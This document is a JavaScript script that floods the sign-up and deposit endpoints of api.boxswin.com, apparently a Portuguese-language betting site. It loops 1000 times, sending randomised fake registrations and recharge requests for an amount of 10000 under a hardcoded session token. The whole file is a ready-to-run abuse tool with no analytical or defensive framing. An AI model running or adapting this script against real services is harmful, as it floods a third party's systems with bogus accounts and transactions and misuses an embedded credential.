const url = "https://api.boxswin.com/login/register";


function generateRandomParams() {
    const randomTel = Math.floor(Math.random() * 99999999999);
    const randomArea = Math.floor(Math.random() * 100);
    const randomType = Math.floor(Math.random() * 2) + 1;

    const randomParams = {
        language: "pt-BR",
        token: generateRandomToken(),
        username: generateRandomString(8),
        pwd: generateRandomPassword(),
        repwd: generateRandomPassword(),
        agentid: 'yjaxyc',
        devicetype: generateRandomString(10),
        version: generateRandomString(5),
        code: generateRandomString(4),
        rstime: generateRandomString(6),
        tel: `${randomTel}`,
        area: `${randomArea}`,
        type: `${randomType}`
    };

    return randomParams;
}

function generateRandomToken() {
    return generateRandomString(32);
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomPassword() {
    return generateRandomString(8);
}

const randomParams = generateRandomParams();

async function fetchParams(params) {
    fetch("https://api.boxswin.com/user_recharge/cz?language=pt-BR&token=NDE4M2IzY2IwNGUyNitmbVM1RjNqQ09MNlorclJRSkNBaEVhbWZFdEIyZDBobHFxWjV6SXZLakE9&name=&phone=&email=&bank=&channel_id=2&amount=10000&account=&bank_code=&zipcode=&curp=&recharge_send=1", {
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9,pt;q=0.8",
            "language": "pt-BR",
            "sec-ch-ua": "\"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Linux\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "token": "NDE4M2IzY2IwNGUyNitmbVM1RjNqQ09MNlorclJRSkNBaEVhbWZFdEIyZDBobHFxWjV6SXZLakE9"
        },
        "referrer": "https://www.boxswin.com/",
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": null,
        "method": "GET",
        "mode": "cors",
        "credentials": "omit"
    })

    fetch(url, params);
}

(async () => {
    for (let i = 0; i < 1000; i++) {
        const params = {
            method: "POST",
            headers: {
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.9,pt;q=0.8",
                "Referer": "https://www.boxswin.com/",
                "Referrer-Policy": "strict-origin-when-cross-origin"
            },
            body: new URLSearchParams(randomParams)
        };
        await fetchParams(params);
    }
    
})();
